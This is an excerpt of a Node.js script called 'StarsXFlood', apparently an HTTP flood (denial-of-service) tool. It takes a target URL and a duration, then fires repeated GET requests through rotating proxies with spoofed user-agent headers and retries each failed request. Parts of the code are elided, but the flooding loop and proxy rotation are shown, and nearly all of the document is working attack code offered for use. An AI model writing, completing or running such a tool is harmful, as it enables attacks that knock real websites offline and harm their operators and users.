...
if (process.argv.length < 4) {
  console.clear()
  console.log(`
[!] StarsXFlood By PermenMD [!]
Command: node StarsXFlood.js [Target] [Durasi]
  `);
  process.exit();
}
...
function sendRequest(target, agent, userID, userAgent) {
  if (permenmd.includes(userID)) {
    ...
    axios.get(target, { httpAgent: agent, headers: headers, timeout: 5000 })
      .then(response => {})
      .catch(error => {
        console.error(`Request error: ${error.message}`);
        setTimeout(() => sendRequest(target, agent, userID, userAgent), 100);
      });
  } else {
...
function sendRequests() {
  ...
  function sendRequestUsingNextProxy() {
    if (currentIndex < proxyList.length) {
      ...
      sendRequest(targetUrl, agent, userID, userAgent);
      currentIndex++;
